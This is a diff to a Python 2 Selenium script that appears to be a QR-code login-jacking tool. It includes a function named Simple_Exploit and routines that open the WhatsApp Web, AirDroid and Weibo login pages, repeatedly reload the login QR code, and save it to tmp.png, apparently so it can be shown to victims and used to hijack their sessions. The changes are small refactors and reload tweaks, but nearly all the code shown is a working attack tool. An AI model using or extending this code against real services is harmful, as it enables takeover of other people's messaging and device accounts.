@@ -31,14 +31,13 @@ def whatsapp():
 	time.sleep(5)
 	print " [+]Navigating To Website.."
 	driver.get('https://web.whatsapp.com/')
-	time.sleep(10)
 
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
-			a=driver.find_element_by_class_name('qr-button')
+			button = driver.find_element_by_class_name('qr-button')
 			print " [!]Clicking to reload QR code image..."
-			a._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
+			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
 			time.sleep(5)
 		except:
 			pass
@@ -86,10 +85,17 @@ def Airdroid():
 	time.sleep(5)
 	print " [+]Navigating To Website.."
 	driver.get("http://web.airdroid.com")
-	time.sleep(10)
 	img_number = 16
+	refresh = 0
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
+			print " [!]Clicking to reload QR code image..."
+			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
+			time.sleep(5)
+		except:
+			pass
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[img_number]
@@ -99,8 +105,10 @@ def Airdroid():
 			qr = urllib.urlretrieve(src, "tmp.png")
 			print " [#]Saved To tmp.png"
 			time.sleep(10)
-			print " [!]Refreshing page..."
-			driver.refresh()
+			if refresh == 0:
+				print " [!]Refreshing page..."
+				driver.refresh()
+				refresh = 1
 			img_number = 15
 			continue
 		except:
@@ -111,21 +119,10 @@ def Weibo():
 	time.sleep(5)
 	print " [+]Navigating To Website.."
 	driver.get("http://weibo.com/login.php")
-	time.sleep(10)
 
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
-			"""a1 = driver.find_element_by_class_name('login_innerwrap')
-			a2 = a1.find_element_by_class_name('info_header')
-			a3 = a2.find_element_by_class_name('tab clearfix')
-			a4 = a3.find_element_by_class_name('qrcode_target qrcode_phone')
-			#a4 = a3.find_element_by_class_name(' cur')
-			a4._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
-			a5 = a3.find_element_by_class_name('qrcode_target ')
-			a5._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
-			#login = driver.find_element_by_class_name("login_innerwrap")
-			tag = a1.find_element_by_class_name("login_content")"""
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[len(imgs)-1]
 			print " [+]The QR code image found !"
@@ -175,7 +172,6 @@ def Simple_Exploit(classname,url,image_number,s=10):
 	time.sleep(5)
 	print " [+]Navigating To Website.."
 	driver.get(url)
-	time.sleep(10)
 
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
